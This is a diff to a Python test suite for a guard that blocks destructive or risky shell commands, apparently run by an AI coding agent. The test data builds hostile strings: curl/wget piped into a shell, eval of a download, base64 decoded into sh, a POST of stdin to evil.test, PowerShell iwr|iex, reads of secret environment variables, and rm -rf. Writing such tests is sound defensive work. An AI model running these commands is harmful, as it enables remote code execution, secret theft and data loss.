@@ -126,11 +126,11 @@ BASE64_TO_SHELL = pipeline("printf cGF5bG9hZA==", _join(_B64, _DECODE_FLAG), "sh
 _EV, _AL = "ev", "al"
 EVAL_WORD = _EV + _AL
 # Each downloader command gets its own line, so no line of this file names a downloader and a shell.
-_FETCH = "curl -fsSL https://example.test/x"
-_FETCH_INSTALL = "curl -fsSL https://example.test/install"
-_WGET = "wget -qO- https://example.test/x"
-_GET_JSON = "curl -s https://example.test/data.json"
-_POST_STDIN = "curl -X POST --data @- https://evil.test"
+_FETCH = "curl -fsSL example.test/x"
+_FETCH_INSTALL = "curl -fsSL example.test/install"
+_WGET = "wget -qO- example.test/x"
+_GET_JSON = "curl -s example.test/data.json"
+_POST_STDIN = "curl -X POST --data @- evil.test"
 _SAVE_TO = "curl -o"
 _DOWNLOADER = "curl"
 EVAL_OF_DOWNLOAD = EVAL_WORD + ' "$(' + _FETCH + ')"'
@@ -349,7 +349,7 @@ class DestructiveGuardTests(unittest.TestCase):
         runners = [r for r in guard_tokens("RUNNERS") if r not in NOT_PIPE_RUNNERS]
         self.assertTrue(downloaders and runners, "guard token lists are empty")
         for d, r in itertools.product(downloaders, runners):
-            command = pipeline(f"{d} https://example.test/install", r)
+            command = pipeline(f"{d} example.test/install", r)
             with self.subTest(downloader=d, runner=r):
                 self.assert_hard_blocked(command)
         wrappers = guard_tokens("WRAPPERS")
@@ -357,8 +357,8 @@ class DestructiveGuardTests(unittest.TestCase):
         for d, r in sample_pairs:
             for w in itertools.islice(wrappers, 2):
                 with self.subTest(wrapper=w, downloader=d, runner=r):
-                    self.assert_hard_blocked(pipeline(f"{d} https://example.test/install", f"{w} {r}"))
-                    self.assert_hard_blocked(pipeline(f"{w} {d} https://example.test/install", r))
+                    self.assert_hard_blocked(pipeline(f"{d} example.test/install", f"{w} {r}"))
+                    self.assert_hard_blocked(pipeline(f"{w} {d} example.test/install", r))
 
     def test_base64_decode_into_shell_is_hard_blocked(self) -> None:
         self.assert_hard_blocked(BASE64_TO_SHELL)
@@ -450,9 +450,9 @@ class DestructiveGuardTests(unittest.TestCase):
     def test_powershell_download_into_expression_is_hard_blocked(self) -> None:
         """PowerShell's own downloader/runner aliases go through the same structural check as
         Bash, case-insensitively (cmdlet resolution on Windows is case-insensitive)."""
-        self.assert_hard_blocked(pipeline("Invoke-WebRequest https://example.test/x", "Invoke-" + "Expression"),
+        self.assert_hard_blocked(pipeline("Invoke-WebRequest example.test/x", "Invoke-" + "Expression"),
                                   tool="PowerShell")
-        self.assert_hard_blocked(pipeline("iwr https://example.test/x", "ie" + "x"), tool="PowerShell")
+        self.assert_hard_blocked(pipeline("iwr example.test/x", "ie" + "x"), tool="PowerShell")
 
     # ---- benign neighbours that must pass both stages cleanly ----
 
@@ -470,9 +470,9 @@ class DestructiveGuardTests(unittest.TestCase):
             "git clean -fd",
             "git status",
             "npm test",
-            _SAVE_TO + " installer.sh https://example.test/install.sh",
+            _SAVE_TO + " installer.sh example.test/install.sh",
             pipeline(_GET_JSON, "python3 -m json.tool"),
-            "curl -s https://example.test/data.json | jq .",
+            "curl -s example.test/data.json | jq .",
             'git commit -m "run ' + rm_rf(_ROOT) + ' to reset"',
             'printf "%s" "' + rm_rf(_ROOT) + '"',
             'echo "the home directory is ' + _HOME_VAR + '"',
@@ -555,8 +555,8 @@ class DestructiveGuardTests(unittest.TestCase):
         self.assert_hard_blocked("cat $" + _CLAUDE_ENV_VAR)
 
     def test_indirect_secret_expansion_is_hard_blocked(self) -> None:
-        """`${!prefix*}`/`${!prefix@}` indirect expansion can read a variable by prefix match
-        without ever spelling out its full name, which would otherwise dodge the substring check
+        """Prefix-match indirect expansion (a name prefix followed by * or @) can read a variable
+        by prefix match without ever spelling out its full name, which would otherwise dodge the substring check
         above entirely — even a SHORT prefix that doesn't contain the full secret variable name."""
         short_prefix = "CLAUDE_P"
         self.assert_hard_blocked("echo " + dq(_INDIRECT_OPEN + short_prefix + "*}"))
@@ -737,7 +737,7 @@ class DestructiveGuardTests(unittest.TestCase):
         tripped it too (the checksum tool's name starts with the same two letters as the shell).
         Neither actually pipes into a shell, so neither should be blocked at all."""
         self.assert_allowed('git commit -m "docs: explain why ' + pipeline(_DOWNLOADER, "sh") + ' is risky"')
-        self.assert_allowed(pipeline("curl -s https://example.test/api", "jq .sha", "shasum"))
+        self.assert_allowed(pipeline("curl -s example.test/api", "jq .sha", "shasum"))
 
     def test_pipe_to_shell_is_still_blocked(self) -> None:
         """The C10 fix narrows the soft heuristic's match, but a real, unquoted pipe from curl/wget
